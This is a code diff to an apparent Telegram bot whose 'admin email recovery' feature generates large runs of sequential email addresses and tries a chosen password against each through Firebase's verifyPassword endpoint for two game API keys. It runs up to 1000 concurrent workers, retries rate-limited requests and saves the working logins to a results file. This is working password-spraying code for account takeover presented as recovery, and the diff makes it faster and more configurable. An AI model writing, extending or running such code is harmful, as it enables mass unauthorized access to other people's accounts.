@@ -36,6 +36,10 @@ RETRY_DELAY = 2
 RESULTS_FILE = None
 RETRY_LATER_FILE = "retry_later.txt"
 PROGRESS_FILE = "progress.json"
+DEFAULT_RECOVERY_WORKERS = 1000
+MIN_RECOVERY_WORKERS = 1
+MAX_RECOVERY_WORKERS = 1000
+PROGRESS_WRITE_INTERVAL = 2
 
 recovery_stop_event = asyncio.Event()
 current_recovery_task = None
@@ -50,6 +54,7 @@ recovery_progress = {
     "current": None,
     "stopped": False,
     "results_file": None,
+    "workers": DEFAULT_RECOVERY_WORKERS,
 }
 progress_lock = asyncio.Lock()
 file_lock = asyncio.Lock()
@@ -177,13 +182,63 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== ADMIN RECOVER COMMAND =====
 async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin-only email recovery command"""
+    """Admin-only email recovery command.
+
+    Usage:
+    /recover                    -> existing interactive recovery flow
+    /recover <pattern> <threads> -> direct pattern flow using a selected worker count
+    """
     user_id = update.effective_user.id
-    
+
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized. Admin only.")
         return
-    
+
+    if context.args:
+        if len(context.args) != 2:
+            await update.message.reply_text(
+                "Usage: /recover <pattern> <threads>\n"
+                "Example: /recover user(1-1000)@gmail.com 50\n\n"
+                "Use /recover with no arguments for the existing interactive flow."
+            )
+            return
+
+        pattern = context.args[0].strip()
+        workers = clamp_recovery_workers(context.args[1])
+        if workers is None:
+            await update.message.reply_text(
+                f"❌ Invalid threads value. Use a number from {MIN_RECOVERY_WORKERS} to {MAX_RECOVERY_WORKERS}."
+            )
+            return
+
+        parsed = parse_email_pattern(pattern)
+        if not parsed:
+            await update.message.reply_text(
+                "❌ Invalid pattern format. Use: base(num)@domain.com or base(num1-num2)@domain.com"
+            )
+            return
+
+        base, start, end, domain = parsed
+        total = end - start + 1
+        context.user_data.clear()
+        context.user_data.update({
+            "step": "admin_recover_game_for_direct",
+            "recover_base": base,
+            "recover_start": start,
+            "recover_end": end,
+            "recover_domain": domain,
+            "recover_pattern": pattern,
+            "recover_workers": workers,
+        })
+        await update.message.reply_text(
+            f"📧 Recovery pattern accepted: `{pattern}`\n"
+            f"Range: **{total:,}** emails\n"
+            f"Workers for this run: **{workers}**\n\n"
+            "Now type `cpm1` or `cpm2` to choose the game. The next message after that will be the password to check.",
+            parse_mode="Markdown",
+        )
+        return
+
     game_selection = """
 🔐 **ADMIN: Email Recovery**
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -229,8 +284,8 @@ def update_request(id_token, api_key, new_email=None, new_password=None):
 
 # ===== ULTRA-FAST EMAIL RECOVERY FUNCTIONS =====
 def parse_email_pattern(pattern):
-    """Parse email patterns like tannercpm(10000)@gmail.com"""
-    match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
+    """Parse email patterns like user.name(1-1000)@gmail.com."""
+    match = re.match(r'^([a-zA-Z0-9._+-]+)\((\d+)(?:-(\d+))?\)@([A-Za-z0-9.-]+\.[A-Za-z]{2,})$', pattern)
     if not match:
         return None
     
@@ -243,37 +298,120 @@ def parse_email_pattern(pattern):
     
     return base, start, end, domain
 
+def clamp_recovery_workers(value):
+    """Validate and clamp an admin-supplied recovery worker count."""
+    try:
+        workers = int(value)
+    except (TypeError, ValueError):
+        return None
+    if workers < MIN_RECOVERY_WORKERS:
+        return None
+    return min(workers, MAX_RECOVERY_WORKERS)
+
+def firebase_error_message(data):
+    """Extract a sanitized Firebase/Identity Toolkit error message."""
+    if isinstance(data, dict):
+        error = data.get("error")
+        if isinstance(error, dict):
+            return str(error.get("message") or error.get("status") or error)
+        return str(data.get("message") or data)
+    return str(data or "")
+
+def normalize_recovery_status(status, data=None):
+    """Normalize provider/client responses into found, permanent, or temporary statuses."""
+    if status == "found":
+        return "found", data
+
+    message = firebase_error_message(data)
+    upper_message = message.upper()
+
+    if status in {"not_found", "wrong_password", "invalid", "banned", "invalid_password", "permanent_auth_failure"}:
+        return status, data
+
+    if any(marker in upper_message for marker in [
+        "EMAIL_NOT_FOUND",
+        "INVALID_EMAIL",
+        "INVALID_PASSWORD",
+        "USER_DISABLED",
+        "ACCOUNT_NOT_FOUND",
+        "NOT_FOUND",
+    ]):
+        if "INVALID_PASSWORD" in upper_message:
+            return "wrong_password", data
+        return "not_found", data
+
+    if status in {"timeout", "connection_reset", "empty_response", "invalid_json", "http_429", "http_500", "http_502", "http_503", "http_504"}:
+        return status, data
+
+    if any(marker in upper_message for marker in [
+        "TOO_MANY_ATTEMPTS_TRY_LATER",
+        "QUOTA_EXCEEDED",
+        "RESOURCE_EXHAUSTED",
+        "RATE_LIMIT",
+        "RATE LIMIT",
+        "TOO MANY REQUESTS",
+        "UNAVAILABLE",
+        "DEADLINE_EXCEEDED",
+        "INTERNAL",
+        "BACKEND_ERROR",
+        "SERVER_ERROR",
+        "TIMEOUT",
+    ]):
+        return "temporary_error", message
+
+    return status or "unknown", data
+
 def is_temporary_failure(status, data=None):
     """Return True when a recovery check result should be retried."""
-    if status in {"timeout", "connection_reset", "empty_response", "http_429", "http_500", "http_502", "http_503", "http_504"}:
+    status, data = normalize_recovery_status(status, data)
+    if status in {
+        "timeout",
+        "connection_reset",
+        "empty_response",
+        "invalid_json",
+        "temporary_error",
+        "http_429",
+        "http_500",
+        "http_502",
+        "http_503",
+        "http_504",
+    }:
         return True
-    if status == "error":
-        message = str(data or "").lower()
-        temporary_markers = [
-            "timeout",
-            "connection reset",
-            "clienterror",
-            "client error",
-            "server disconnected",
-            "temporarily unavailable",
-            "too many requests",
-            "429",
-            "500",
-            "502",
-            "503",
-            "504",
-            "empty",
-            "none",
-            "null",
-        ]
-        return any(marker in message for marker in temporary_markers)
-    return False
+    message = firebase_error_message(data).upper()
+    temporary_markers = [
+        "TIMEOUT",
+        "CONNECTION RESET",
+        "CLIENTERROR",
+        "CLIENT ERROR",
+        "SERVER DISCONNECTED",
+        "TEMPORARILY UNAVAILABLE",
+        "TOO_MANY_ATTEMPTS_TRY_LATER",
+        "TOO MANY REQUESTS",
+        "QUOTA_EXCEEDED",
+        "RESOURCE_EXHAUSTED",
+        "RATE_LIMIT",
+        "UNAVAILABLE",
+        "DEADLINE_EXCEEDED",
+        "INTERNAL",
+        "BACKEND_ERROR",
+        "SERVER_ERROR",
+        "429",
+        "500",
+        "502",
+        "503",
+        "504",
+        "EMPTY",
+        "NONE",
+        "NULL",
+    ]
+    return any(marker in message for marker in temporary_markers)
 
 def is_permanent_failure(status, data=None):
     """Return True when a recovery check result should not be retried."""
+    status, data = normalize_recovery_status(status, data)
     if status in {"not_found", "wrong_password", "invalid", "banned", "invalid_password", "permanent_auth_failure"}:
         return True
-    message = str(data or "").upper()
+    message = firebase_error_message(data).upper()
     permanent_markers = [
         "EMAIL_NOT_FOUND",
         "INVALID_EMAIL",
@@ -369,38 +507,45 @@ async def check_with_retry(account, session=None):
     return "unknown", last_error
 
 async def fast_check_email(email, password, api_key, session=None):
-    """Fast async email check"""
+    """Fast async email check with structured response classification."""
+    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
+    payload = {"email": email, "password": password, "returnSecureToken": True}
+
+    async def _post(active_session):
+        async with active_session.post(url, json=payload) as resp:
+            status_code = resp.status
+            text_body = await resp.text()
+            if not text_body:
+                if status_code in {429, 500, 502, 503, 504}:
+                    return f"http_{status_code}", {"http_status": status_code, "message": "empty_response"}
+                return "empty_response", {"http_status": status_code, "message": "empty_response"}
+            try:
+                data = json.loads(text_body)
+            except json.JSONDecodeError:
+                return "invalid_json", {"http_status": status_code, "message": text_body[:300]}
+
+            if status_code in {429, 500, 502, 503, 504}:
+                return f"http_{status_code}", data
+
+            if "idToken" in data:
+                return "found", data
+
+            error = firebase_error_message(data)
+            normalized_status, normalized_data = normalize_recovery_status("error", error)
+            if normalized_status in {"not_found", "wrong_password", "temporary_error"}:
+                return normalized_status, normalized_data
+            if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
+                return "not_found", data
+            if "INVALID_PASSWORD" in error:
+                return "wrong_password", data
+            return "error", {"http_status": status_code, "message": error or data}
+
     try:
-        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
-        payload = {"email": email, "password": password, "returnSecureToken": True}
-        
         if session is None:
             timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             async with aiohttp.ClientSession(timeout=timeout) as temp_session:
-                async with temp_session.post(url, json=payload) as resp:
-                    if resp.status in {429, 500, 502, 503, 504}:
-                        return f"http_{resp.status}", None
-                    data = await resp.json(content_type=None)
-        else:
-            async with session.post(url, json=payload) as resp:
-                if resp.status in {429, 500, 502, 503, 504}:
-                    return f"http_{resp.status}", None
-                data = await resp.json(content_type=None)
-        
-        if not data:
-            return "empty_response", None
-        
-        if "idToken" in data:
-            return "found", data
-        
-        error = data.get("error", {}).get("message", "")
-        if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
-            return "not_found", None
-        elif "INVALID_PASSWORD" in error:
-            return "wrong_password", None
-        else:
-            return "error", error
-            
+                return await _post(temp_session)
+        return await _post(session)
     except asyncio.TimeoutError:
         return "timeout", None
     except aiohttp.ClientError as e:
@@ -410,22 +555,25 @@ async def fast_check_email(email, password, api_key, session=None):
     except Exception as e:
         return "error", str(e)
 
-async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=None, results_file=None):
+async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=None, results_file=None, worker_count=None):
     """
-    UNLIMITED RANGE: Memory-efficient generator-based concurrent checking
-    Streams results instead of loading all into memory
-    MAXIMUM CONCURRENCY: 1000 concurrent requests per batch (preserved from existing code)
+    Memory-efficient concurrent recovery checker.
+    Preserves the existing default concurrency of 1000, but allows an admin-selected
+    lower worker count for a single /recover <pattern> <threads> run.
     """
-    checked = 0
     total = end - start + 1
-    found_count = 0
-    invalid_count = 0
-    unknown_count = 0
-    current_position = start
+    workers = clamp_recovery_workers(worker_count) if worker_count is not None else DEFAULT_RECOVERY_WORKERS
+    if workers is None:
+        workers = DEFAULT_RECOVERY_WORKERS
+    workers = min(workers, total) if total > 0 else 1
 
-    # Determine optimal batch size (1000 is the maximum safe limit)
-    # For massive ranges, we use 1000 concurrent requests
-    batch_size = min(1000, total)  # Preserve existing implemented concurrency
+    counters = {"checked": 0, "found": 0, "invalid": 0, "unknown": 0, "current": start}
+    result_queue = asyncio.Queue()
+    number_queue = asyncio.Queue()
+    last_progress_write = 0
+
+    for number in range(start, end + 1):
+        number_queue.put_nowait(number)
 
     await update_recovery_progress(
         checked=0,
@@ -434,87 +582,115 @@ async def check_emails_concurrent_generator(base, start, end, domain, password, 
         unknown=0,
         remaining=total,
         total=total,
-        current=current_position,
+        current=start,
         results_file=results_file,
+        workers=workers,
     )
 
+    async def persist_progress(force=False):
+        nonlocal last_progress_write
+        now = time.time()
+        if not force and now - last_progress_write < PROGRESS_WRITE_INTERVAL:
+            return
+        last_progress_write = now
+        await update_recovery_progress(
+            checked=counters["checked"],
+            found=counters["found"],
+            invalid=counters["invalid"],
+            unknown=counters["unknown"],
+            remaining=max(total - counters["checked"], 0),
+            current=counters["current"],
+            results_file=results_file,
+            workers=workers,
+        )
+
+    async def record_unfinished(reason):
+        unfinished = []
+        while True:
+            try:
+                number = number_queue.get_nowait()
+            except asyncio.QueueEmpty:
+                break
+            email = f"{base}{number}@{domain}"
+            unfinished.append(email)
+            number_queue.task_done()
+        for email in unfinished:
+            await save_unknown_account(email, reason)
+        if unfinished:
+            counters["unknown"] += len(unfinished)
+            await persist_progress(force=True)
+
     timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+    connector = aiohttp.TCPConnector(limit=workers)
 
-    # Reuse session across all requests for maximum speed
-    # Limit set to 1000 to preserve existing implementation
-    async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(limit=1000)) as session:
-        for batch_start in range(start, end + 1, batch_size):
-            if recovery_stop_event.is_set():
-                break
-
-            batch_end = min(batch_start + batch_size, end + 1)
-
-            # Create concurrent tasks for this batch (UP TO 1000 CONCURRENT)
-            tasks = []
-            emails = []
-            for i in range(batch_start, batch_end):
-                if recovery_stop_event.is_set():
+    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+        async def worker(worker_id):
+            while not recovery_stop_event.is_set():
+                try:
+                    number = number_queue.get_nowait()
+                except asyncio.QueueEmpty:
                     break
-                email = f"{base}{i}@{domain}"
-                emails.append((i, email))
+
+                email = f"{base}{number}@{domain}"
                 account = {"email": email, "password": password, "api_key": api_key}
-                tasks.append(check_with_retry(account, session=session))
-
-            if not tasks:
-                break
-
-            # Execute all concurrently (up to 1000 at once)
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-
-            # Process and yield results immediately (no memory buildup)
-            for (email_num, email), result in zip(emails, results):
-                checked += 1
-                current_position = email_num
-
-                if isinstance(result, tuple):
-                    status = result[0]
-                    data = result[1]
+                try:
+                    result = await check_with_retry(account, session=session)
+                    if not isinstance(result, tuple):
+                        result = ("unknown", str(result))
+                    status, data = result[0], result[1] if len(result) > 1 else None
+                    status, data = normalize_recovery_status(status, data)
 
                     if status == "found":
-                        found_count += 1
+                        counters["found"] += 1
+                        found_record = {
+                            "email": email,
+                            "password": password,
+                            "status": status,
+                        }
                         if results_file:
-                            await append_found_account(results_file, {
-                                "email": email,
-                                "password": password,
-                                "status": status,
-                            })
-                        yield (email, status, data)
-                    elif status == "unknown":
-                        unknown_count += 1
-                    elif status in {"not_found", "wrong_password", "invalid", "banned", "invalid_password", "permanent_auth_failure"}:
-                        invalid_count += 1
+                            await append_found_account(results_file, found_record)
+                        await result_queue.put((email, status, data))
+                    elif is_permanent_failure(status, data):
+                        counters["invalid"] += 1
                     else:
-                        unknown_count += 1
-                        await save_unknown_account(email, status)
-                else:
-                    unknown_count += 1
-                    await save_unknown_account(email, str(result))
+                        counters["unknown"] += 1
+                        await save_unknown_account(email, firebase_error_message(data) or status)
+                except Exception as e:
+                    counters["unknown"] += 1
+                    await save_unknown_account(email, f"worker_error: {e}")
+                finally:
+                    counters["checked"] += 1
+                    counters["current"] = number
+                    number_queue.task_done()
+                    await persist_progress()
+                    if progress_callback and counters["checked"] % 10000 == 0:
+                        await progress_callback(counters["checked"], total, counters["found"])
 
-                remaining = max(total - checked, 0)
-                await update_recovery_progress(
-                    checked=checked,
-                    found=found_count,
-                    invalid=invalid_count,
-                    unknown=unknown_count,
-                    remaining=remaining,
-                    current=current_position,
-                    results_file=results_file,
-                )
+        worker_tasks = [asyncio.create_task(worker(i)) for i in range(workers)]
 
-                # Progress callback every 10000 checks, preserving existing Telegram update frequency trigger
-                if progress_callback and checked % 10000 == 0:
-                    await progress_callback(checked, total, found_count)
-
+        while True:
+            if all(task.done() for task in worker_tasks) and result_queue.empty():
+                break
+            try:
+                item = await asyncio.wait_for(result_queue.get(), timeout=0.5)
+            except asyncio.TimeoutError:
                 if recovery_stop_event.is_set():
                     break
+                continue
+            else:
+                yield item
+                result_queue.task_done()
 
-            if recovery_stop_event.is_set():
-                break
+        if recovery_stop_event.is_set():
+            for task in worker_tasks:
+                if not task.done():
+                    task.cancel()
+            await asyncio.gather(*worker_tasks, return_exceptions=True)
+            await record_unfinished("stopped_before_check")
+        else:
+            await asyncio.gather(*worker_tasks, return_exceptions=True)
+
+    await persist_progress(force=True)
 
 # ===== SESSIONS =====
 sessions = {}  # user_id -> {id_token, email, game_name, api_key}
@@ -632,7 +808,7 @@ async def send_recovery_results(update: Update, results_file=None):
     await update.message.reply_text("No recovered accounts have been saved yet.")
     return False
 
-async def run_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE, base, start_num, end_num, domain, password, game, api_key, progress_msg, start_time, filename):
+async def run_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE, base, start_num, end_num, domain, password, game, api_key, progress_msg, start_time, filename, worker_count=None):
     """Run the recovery process in the background so the bot remains responsive."""
     global recovery_running, current_recovery_task, RESULTS_FILE
 
@@ -640,6 +816,10 @@ async def run_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE, base,
     total = end_num - start_num + 1
     RESULTS_FILE = filename
     last_update_time = 0
+    workers = clamp_recovery_workers(worker_count) if worker_count is not None else DEFAULT_RECOVERY_WORKERS
+    if workers is None:
+        workers = DEFAULT_RECOVERY_WORKERS
+    workers = min(workers, total) if total > 0 else 1
 
     async def update_progress(checked, total_emails, found):
         nonlocal last_update_time
@@ -665,6 +845,7 @@ Pattern: **{base}({start_num:,}-{end_num:,})@{domain}**
 Checked: **{checked:,}/{total_emails:,}**
 Speed: **{speed:.1f} emails/sec**
 Found: **{found}**
+Workers: **{workers}**
 ETA: **{int(remaining)}s**
 
 ⏱ Updates every 4 minutes
@@ -685,6 +866,7 @@ Use /stop to stop recovery and save progress.
             current=start_num,
             stopped=False,
             results_file=filename,
+            workers=workers,
         )
 
         # Run concurrent check with generator (no memory buildup)
@@ -697,6 +879,7 @@ Use /stop to stop recovery and save progress.
             api_key,
             progress_callback=update_progress,
             results_file=filename,
+            worker_count=workers,
         ):
             if recovery_stop_event.is_set():
                 break
@@ -724,6 +907,7 @@ Use /stop to stop recovery and save progress.
             "progress_file": PROGRESS_FILE,
             "results_file": filename,
             "retry_later_file": RETRY_LATER_FILE,
+            "workers": workers,
             "successful_logins": found_emails
         }
 
@@ -740,6 +924,7 @@ Use /stop to stop recovery and save progress.
 Game: **{game}**
 Checked: **{checked_count:,}/{total:,}**
 Found: **{found_count} account(s)**
+Workers: **{workers}**
 Remaining: **{max(total - checked_count, 0):,}**
 Stopped at: **{recovery_progress.get('current')}**
 
@@ -752,6 +937,7 @@ Stopped at: **{recovery_progress.get('current')}**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Game: **{game}**
 Found: **{found_count} account(s)** ✅
+Workers: **{workers}**
 Checked: **{checked_count:,}** emails
 Time: **{elapsed:.1f}s**
 Speed: **{checked_count/elapsed:.1f} emails/sec**
@@ -765,6 +951,7 @@ Speed: **{checked_count/elapsed:.1f} emails/sec**
 ❌ **RECOVERY COMPLETE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 No matching accounts found.
+Workers: **{workers}**
 Checked: **{checked_count:,}** emails
 Time: **{elapsed:.1f}s**
 Speed: **{checked_count/elapsed:.1f} emails/sec**
@@ -958,6 +1145,30 @@ Which game would you like to login to?
             await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
         return
 
+    # ----- ADMIN DIRECT RECOVERY GAME SELECTION (/recover pattern threads) -----
+    elif step == 'admin_recover_game_for_direct':
+        if user_id != ADMIN_ID:
+            await update.message.reply_text("❌ Unauthorized.")
+            return
+
+        if text in ['cpm1', 'cpm2']:
+            game = text.upper()
+            context.user_data['recover_game'] = game
+            context.user_data['recover_api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
+            context.user_data['step'] = 'admin_recover_password_input'
+            pattern = context.user_data.get('recover_pattern') or f"{context.user_data['recover_base']}({context.user_data['recover_start']}-{context.user_data['recover_end']})@{context.user_data['recover_domain']}"
+            workers = context.user_data.get('recover_workers', DEFAULT_RECOVERY_WORKERS)
+            await update.message.reply_text(
+                f"🔐 Enter Password to Check\n"
+                f"Pattern: `{pattern}`\n"
+                f"Workers: **{workers}**\n\n"
+                "Enter the password to check:",
+                parse_mode="Markdown",
+            )
+        else:
+            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
+        return
+
     # ----- ADMIN EMAIL RECOVERY GAME SELECTION -----
     elif step == 'admin_recover_game':
         if user_id != ADMIN_ID:
@@ -981,7 +1192,7 @@ Enter an email pattern to check:
 - `tannercpm(1-100000)@domain.com` - Checks 100K emails
 
 ⚡ **MAXIMUM CONCURRENCY MODE**
-- 5000 concurrent requests per batch
+- Default 1000 workers, or use `/recover pattern threads` for a lower admin-selected worker count
 - No limit on range size (1M-99M with ease)
 - Memory efficient streaming
 - Results streamed to JSON
@@ -1022,6 +1233,7 @@ Enter the password to check:
         context.user_data['recover_start'] = start
         context.user_data['recover_end'] = end
         context.user_data['recover_domain'] = domain
+        context.user_data['recover_workers'] = DEFAULT_RECOVERY_WORKERS
         return
 
     # ----- ADMIN EMAIL RECOVERY PASSWORD INPUT -----
@@ -1038,6 +1250,8 @@ Enter the password to check:
         domain = context.user_data['recover_domain']
         game = context.user_data['recover_game']
         api_key = context.user_data['recover_api_key']
+        workers = context.user_data.get('recover_workers', DEFAULT_RECOVERY_WORKERS)
+        workers = clamp_recovery_workers(workers) or DEFAULT_RECOVERY_WORKERS
         
         total = end - start + 1
 
@@ -1059,7 +1273,7 @@ Pattern: **{base}({start:,}-{end:,})@{domain}**
 Total: **{total:,} emails**
 Status: **Starting in background...**
 
-Concurrency: **5000 emails at a time**
+Workers: **{workers}**
 Other bot commands will still work.
 Use /stop to stop recovery and save progress.
 """, parse_mode="Markdown")
@@ -1079,6 +1293,7 @@ Use /stop to stop recovery and save progress.
             current=start,
             stopped=False,
             results_file=filename,
+            workers=workers,
         )
 
         current_recovery_task = asyncio.create_task(
@@ -1095,6 +1310,7 @@ Use /stop to stop recovery and save progress.
                 progress_msg,
                 start_time,
                 filename,
+                workers,
             )
         )
 
